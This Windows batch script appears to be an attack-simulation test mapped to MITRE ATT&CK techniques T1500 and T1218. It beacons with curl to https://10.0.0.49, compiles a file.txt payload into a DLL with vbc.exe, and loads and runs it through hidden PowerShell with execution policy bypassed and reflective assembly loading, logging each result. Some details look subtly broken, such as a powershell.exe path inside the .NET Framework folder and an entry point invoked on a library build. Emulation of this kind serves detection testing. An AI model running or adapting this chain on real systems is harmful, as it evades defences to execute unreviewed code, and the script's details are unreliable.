@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\8878\2b18c2f6
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8878-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=project.txt
SET njozco=file.txt
SET kkjwr=8878
SET ohiegs=%APPDATA%\!ufeybybm!\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][!lqyereup!]: startup=success>> "!ohiegs!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: heartbeat=sent>> "!ohiegs!" 2>nul

cd /d "!recnn!"
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: chdir=!recnn!>> "!ohiegs!" 2>nul

SET jwewr=C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe
SET szup=!jwewr! /target:library /out:"!hpnjatpj!" "!njozco!"
%szup%

SET dvxr=0
IF EXIST "!hpnjatpj!" (
 SET dvxr=1
 echo [%DATE% %TIME%][DEBUG][!lqyereup!]: compile=success>> "!ohiegs!" 2>nul
) ELSE (
 echo [%DATE% %TIME%][DEBUG][!lqyereup!]: compile=failed>> "!ohiegs!" 2>nul
)

SET ukggo=0
SET otxbd=
IF !dvxr!==1 (
 SET wqknm=C:\Windows\Microsoft.NET\Framework\v4.0.30319\powershell.exe
 !wqknm! -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('!hpnjatpj!')).EntryPoint.Invoke($null, @(,[string[]]@())) }"
 IF !ERRORLEVEL!==0 (
  SET ukggo=1
  echo [%DATE% %TIME%][DEBUG][!lqyereup!]: execution=success>> "!ohiegs!" 2>nul
 ) ELSE (
  SET otxbd=assembly_load_failed
  echo [%DATE% %TIME%][DEBUG][!lqyereup!]: execution=failed>> "!ohiegs!" 2>nul
 )
)

SET oyebd=%DATE%-%TIME%
SET oyebd=!oyebd:/=-!
SET oyebd=!oyebd:.=:!
SET oyebd=!oyebd:,=.!
echo [!oyebd!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!dvxr!:!otxbd!>> "!ohiegs!" 2>nul
SET oyebd=%DATE%-%TIME%
SET oyebd=!oyebd:/=-!
SET oyebd=!oyebd:.=:!
SET oyebd=!oyebd:,=.!
echo [!oyebd!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|System Binary Proxy Execution=!ukggo!:!otxbd!>> "!ohiegs!" 2>nul